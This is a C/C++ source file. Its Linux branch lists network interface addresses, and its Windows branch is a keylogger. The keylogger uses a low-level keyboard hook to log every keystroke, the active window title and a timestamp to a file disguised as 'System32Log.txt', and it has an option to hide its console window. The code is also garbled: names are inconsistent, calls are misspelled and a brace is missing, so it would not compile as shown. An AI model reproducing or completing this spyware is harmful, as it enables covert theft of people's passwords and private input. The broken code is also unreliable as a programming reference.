

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>



#if defined (__linux) 
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netdb.h>
#include <ifaddrs.h>
#include <linux/if_link.h>
int main(int argc, char *argv[])
{
  struct ifaddrs *ifaddr, *ifa;
  int family, s, n;
  char host[NI_MAXHOST];
 
  if (getifaddrs(&ifaddr) == -1) {
    perror("getifaddrs");
    exit(EXIT_FAILURE);
  }
 
  /* Walk through linked list, maintaining head pointer so we can free list later */
 
  for (ifa = ifaddr, n = 0; ifa != NULL; ifa = ifa->ifa_next, n++) {
    if (ifa->ifa_addr == NULL)
      continue;
 
    family = ifa->ifa_addr->sa_family;

  /* For an AF_INET* interface address, display the address */
 
    if (family == AF_INET || family == AF_INET6) {
      s = getnameinfo(ifa->ifa_addr,
        (family == AF_INET) ? sizeof(struct sockaddr_in) :
        sizeof(struct sockaddr_in6),
        host, NI_MAXHOST,
        NULL, 0, NI_NUMERICHOST);
      if (s != 0) {
        printf("getnameinfo() failed: %s\n", gai_strerror(s));
        exit(EXIT_FAILURE);
      }
  
      printf("address: <%s>\n", host);
  
    }
  }
 
  freeifaddrs(ifaddr);
  exit(EXIT_SUCCESS);
}

//windows time
#else
#if defined (_WIN32)
#include <windows.h>
#include <time.h>
#include <iostream>
#include <cstdio>
#include <fstream>

//globals
#define visible
HHOOK _hook;
KBDLLHOOKSTRUCT kdbStruct;

int Save(int stroke);
std::ofstream OUTPUTFILE;
extern char lastwindow[256];

//hooking logic
LRESULT __stfcall HookCallback(int nCode, WPARAM wParam, LPARAM lparam){
if(nCode >= 0){
if(wParam == WM_KEYDOWN){
kdbStruct = *((KBDLLHOOKSTRUCT*)lParam);
Save(kdbStruct.vkCode);
}
}
return CallNextHookEx(_hook, nCode, wParam, lParam);
}


void SetHook(){
if(!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0))){
MessageBox(NULL, "Failed to hook", "Error", MB_ICONERROR);
}
}

void ReleaseHook(){
UnhookWindowsHookEx(_hook);
}

//saving the keystroke
int Save(int stroke){
char lastwindow[256];
if(stroke == 1 || (stroke == 2)){
return 0;
}
HWND foreground = GetForegroundWindow();
DWORD threadID;
HKL layout;
if(foreground) {
threadID = GetWindowThreadProcessId(foreground, NULL);
layout = GetKeyboardLayout(threadID);
}

if(foreground){
char window_title[256];
GetWindowText(foreground, window_title, 256);
if(strcmp(window_title, lastwindow)!=0){
strcpy(lastwindow, window_title);

//pulling the time stamp
time_t t = time(NULL);
struct tm *tm = localtime(&t);
chars[64];
strftime(s, sizeof(s), "%c", tm);

//write the active window and the time to file
OUTPUT_FILE << "\n[Window: "<< window_title << " - " << s << "] ";
}
}

std::cout << stroke << '\n';

//tabbed for your pleasure
if (key_stroke == VK_BACK)
        OUTPUT_FILE << "[BACKSPACE]";
	else if (key_stroke == VK_RETURN)
		OUTPUT_FILE <<  "\n";
	else if (key_stroke == VK_SPACE)
		OUTPUT_FILE << " ";
	else if (key_stroke == VK_TAB)
		OUTPUT_FILE << "[TAB]";
	else if (key_stroke == VK_SHIFT || key_stroke == VK_LSHIFT || key_stroke == VK_RSHIFT)
		OUTPUT_FILE << "[SHIFT]";
	else if (key_stroke == VK_CONTROL || key_stroke == VK_LCONTROL || key_stroke == VK_RCONTROL)
		OUTPUT_FILE << "[CONTROL]";
	else if (key_stroke == VK_ESCAPE)
		OUTPUT_FILE << "[ESCAPE]";
	else if (key_stroke == VK_END)
		OUTPUT_FILE << "[END]";
	else if (key_stroke == VK_HOME)
		OUTPUT_FILE << "[HOME]";
	else if (key_stroke == VK_LEFT)
		OUTPUT_FILE << "[LEFT]";
	else if (key_stroke == VK_UP)
		OUTPUT_FILE << "[UP]";
	else if (key_stroke == VK_RIGHT)
		OUTPUT_FILE << "[RIGHT]";
	else if (key_stroke == VK_DOWN)
		OUTPUT_FILE << "[DOWN]";
	else if (key_stroke == 190 || key_stroke == 110)
		OUTPUT_FILE << ".";
	else if (key_stroke == 189 || key_stroke == 109)
		OUTPUT_FILE << "-";
	else if (key_stroke == 20)
		OUTPUT_FILE << "[CAPSLOCK]";
else {
char key;
//caps bool
bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) !=0);

//check shift
if((GetKeyState(VK_SHIFT) & 0x1000) != 0 || (GetKeyState(VK_LSHIFT) & 0x1000) != 0 || (GetKeyState(VK_RSHIFT) & 0x1000) != 0) {
lowercase = !lowercase;
}

//map vk to layout
key = MapVirtualKeyExA(stroke,MAPVK_VK_TO_CHAR, layout);

//to lower if needed,  write to file
if(!lowercase)  key = tolower(key);
OUTPUT_FILE << char(key);
}

OUTPUT_FILE.flush();
return 0;


//stealthy boi
void Stealth(){
#ifdef visible
ShowWindow(findWindowA("ConsoleWindowClass", NULL), 1); 
#endif 
#ifdef invisible
ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0);
#endif
}


//Jesus take the wheel 
int main() 
{
OUT_FILE.open("System32Log.txt", std::ios_base::app);
Stealth();
SetHook; 
//loop keeping it running   
MSG msg;
while(GetMEssage &msg, NULL, 0, 0)){
}	
	

}



#else
printf("I don't know, so I'll write some safe, non-ambitious code here.\n");
#endif
#endif



